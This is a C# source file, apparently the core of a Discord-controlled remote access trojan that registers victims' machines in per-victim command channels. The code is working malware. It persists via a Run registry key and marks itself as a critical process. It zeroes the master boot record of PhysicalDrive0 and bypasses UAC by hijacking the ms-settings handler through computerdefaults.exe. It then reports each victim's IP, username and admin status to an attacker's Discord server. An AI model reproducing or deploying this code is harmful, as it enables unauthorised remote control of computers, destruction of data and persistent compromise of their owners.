using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Net.NetworkInformation;

#pragma warning disable 1998
#pragma warning disable 4014

namespace RATK
{
    internal class BotMain
    {
        public static DiscordSocketClient Client;
        public static StringWriter StringWriter = new StringWriter();
        public static CommandService CommandService;
        public static CommandHandler CommandHandler;
        public static string CommandPrefix = "!";

        public static ICategoryChannel VictimCTG;
        public static IMessageChannel VictimCMDChannel;
        public static IVoiceChannel VictimVoiceChannel;

        public static ICategoryChannel GeneralMachinesCTG;
        public static IMessageChannel GeneralMachinesChannel;
        static readonly string mtx2050 = "Global\\2050homensdiferentes";
        static Mutex mutex;
        
        static async Task Main(string[] args)
        {
            bool a_piroca_e_salgada;
            mutex = new Mutex(true,mtx2050,out a_piroca_e_salgada);

            if (!a_piroca_e_salgada)
            {
                Environment.Exit(0);
            }
            
            Console.SetOut(StringWriter);

            if (Settings.AutoCriticalProcess && RuntimeSettings.IsAdministrator())
            {
                Process.EnterDebugMode();
                RtlSetProcessIsCritical(true, IntPtr.Zero, false);
            }

            if (Settings.AutoOnStartup)
            {
                string appName = Settings.RegistryName;
                string appPath = Process.GetCurrentProcess().MainModule.FileName;

                RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run",
                    true
                );
                startupKey.SetValue(appName, appPath);
            }

            if (Settings.AutoDestroyMBR && RuntimeSettings.IsAdministrator())
            {
                try
                {
                    var mbrData = new byte[512];
                    var mbr = CreateFile(
                        "\\\\.\\PhysicalDrive0",
                        0x10000000,
                        0x1 | 0x2,
                        IntPtr.Zero,
                        0x3,
                        0,
                        IntPtr.Zero
                    );

                    if (mbr == (IntPtr)(-0x1))
                    {
                        EConsole.ELog("(MBR Overwriter) Missing permissions", 3);
                        return;
                    }

                    WriteFile(
                        mbr,
                        mbrData,
                        512,
                        out uint lpNumberOfBytesWritten,
                        IntPtr.Zero
                    );
                }
                catch (Exception ex)
                {
                    EConsole.ELog($"Error: {ex.Message}", 3);
                }
            }

            if (Settings.AutoTryBypassUAC)
            {
                TryBypassUAC();
                return;
            }

            var config = new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.All,
                LogLevel = LogSeverity.Critical
            };

            Client = new DiscordSocketClient(config);
            CommandService = new CommandService();
            CommandHandler = new CommandHandler(Client, CommandService);

            Client.Log += Log;
            Client.Ready += Ready;
            Client.MessageReceived += CommandHandler.HandleCommandAsync;

            await Client.LoginAsync(TokenType.Bot, Settings.BotToken);
            await Client.StartAsync();

            await CommandService.AddModulesAsync(Assembly.GetEntryAssembly(), null);
            await Task.Delay(-1);
        }

        private static Task Log(LogMessage log)
        {
            Console.WriteLine(log);
            return Task.CompletedTask;
        }

        public static void TryBypassUAC()
        {
            string payload = Process.GetCurrentProcess().MainModule.FileName;

            try
            {
                RegistryKey key = Registry.CurrentUser.CreateSubKey(
                    @"Software\Classes\ms-settings\shell\open\command"
                );
                key.SetValue("", payload, RegistryValueKind.String);
                key.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                key.Close();
            }
            catch
            {
                VictimCMDChannel.SendMessageAsync(":x: `Could not bypass UAC :(`");
                return;
            }

            Thread.Sleep(5000);

            try
            {
                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    FileName = "cmd.exe",
                    Arguments = @"/c start computerdefaults.exe"
                };
                Process.Start(startInfo);
            }
            catch
            {
                VictimCMDChannel.SendMessageAsync(":x: `Could not bypass UAC :(`");
                return;
            }

            Thread.Sleep(5000);

            try
            {
                var rkey = Registry.CurrentUser.OpenSubKey(
                    @"Software\Classes\ms-settings\shell\open\command",
                    true
                );
                if (rkey != null)
                {
                    try
                    {
                        Registry.CurrentUser.DeleteSubKey(
                            @"Software\Classes\ms-settings\shell\open\command"
                        );
                    }
                    catch { }
                }
            }
            catch { }
            Environment.Exit(0);
        }

        public static IPAddress LocalIPAddress()
        {
            if (!NetworkInterface.GetIsNetworkAvailable())
            {
                return null;
            }

            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());
            return host.AddressList.FirstOrDefault(ip => ip.AddressFamily == AddressFamily.InterNetwork);
        }

        public static async Task Ready()
        {
            EConsole.ELog("Ready!", 0);

            var guild = Client.GetGuild(Settings.ServerId);
            if (guild == null)
            {
                EConsole.ELog("Could not get guild.", 3);
                return;
            }


            var categoryName = $"{LocalIPAddress()} - {Environment.UserName}";
            VictimCTG = guild.CategoryChannels.FirstOrDefault(c => c.Name == categoryName);

            if (VictimCTG == null)
            {
                var restCategory = await guild.CreateCategoryChannelAsync(categoryName);
                VictimCTG = guild.GetCategoryChannel(restCategory.Id);
            }

            VictimCMDChannel = guild.TextChannels.FirstOrDefault(
                c => c.Name == "commands" && c.CategoryId == VictimCTG.Id
            );

            if (VictimCMDChannel == null)
            {
                var restChannel = await guild.CreateTextChannelAsync(
                    "commands",
                    x => x.CategoryId = VictimCTG.Id
                );
                VictimCMDChannel = guild.GetTextChannel(restChannel.Id);
            }

            var machinesCTG = "Machines";
            GeneralMachinesCTG = guild.CategoryChannels.FirstOrDefault(c => c.Name == machinesCTG);

            if (GeneralMachinesCTG == null)
            {
                var restCategory = await guild.CreateCategoryChannelAsync(machinesCTG);
                GeneralMachinesCTG = guild.GetCategoryChannel(restCategory.Id);
            }

            GeneralMachinesChannel = guild.TextChannels.FirstOrDefault(
                c => c.Name == "commands" && c.CategoryId == GeneralMachinesCTG.Id
            );

            if (GeneralMachinesChannel == null)
            {
                var restChannel = await guild.CreateTextChannelAsync(
                    "commands",
                    x => x.CategoryId = GeneralMachinesCTG.Id
                );
                GeneralMachinesChannel = guild.GetTextChannel(restChannel.Id);
            }

            await VictimCMDChannel.SendMessageAsync(
                $"# :white_check_mark: `User {Environment.UserName} connected! IP: {LocalIPAddress()}| Administrator: {RuntimeSettings.IsAdministrator()} `"
            );

            if (!RuntimeSettings.IsAdministrator() && Settings.AutoCriticalProcess)
            {
                await VictimCMDChannel.SendMessageAsync(
                    ":warning: `Auto Critical Process is enabled, but I couldn't set as critical because the program is not running as administrator.`"
                );
            }

            if (!RuntimeSettings.IsAdministrator() && Settings.AutoDestroyMBR)
            {
                await VictimCMDChannel.SendMessageAsync(
                    ":warning: `Auto Destroy MBR setting was enabled but I couldn't destroy it because I'm not administrator.`"
                );
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int RtlSetProcessIsCritical(bool isCritical, IntPtr reserved, bool needScb);

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile
        );

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);
    }

    public class CommandHandler
    {
        private readonly DiscordSocketClient _client;
        private readonly CommandService _commandService;
        private readonly IServiceProvider _services;

        public CommandHandler(DiscordSocketClient client, CommandService commandService)
        {
            _client = client;
            _commandService = commandService;
            _services = null;
            _commandService.CommandExecuted += CommandExecutedAsync;
        }

        public async Task HandleCommandAsync(SocketMessage arg)
        {
            var message = arg as SocketUserMessage;
            if (message.Author.IsBot)
                return;

            var context = new SocketCommandContext(_client, message);
            if (context.Guild.Id != Settings.ServerId ||
                (context.Channel.Id != BotMain.VictimCMDChannel.Id &&
                 context.Channel.Id != BotMain.GeneralMachinesChannel.Id))
            {
                return;
            }

            int argPos = 0;

            if (message.HasStringPrefix(BotMain.CommandPrefix, ref argPos))
            {
                Task.Run(async () =>
                {
                    var result = await _commandService.ExecuteAsync(context, argPos, _services);
                    if (!result.IsSuccess)
                        await context.Channel.SendMessageAsync($":x: `Error: {result.ErrorReason}`");
                });
            }
        }

        private Task CommandExecutedAsync(Optional<CommandInfo> arg1, ICommandContext arg2, IResult arg3)
        {
            if (!arg3.IsSuccess)
                EConsole.ELog($"CommandError: {arg3.ErrorReason}", 3);
            return Task.CompletedTask;
        }
    }
}
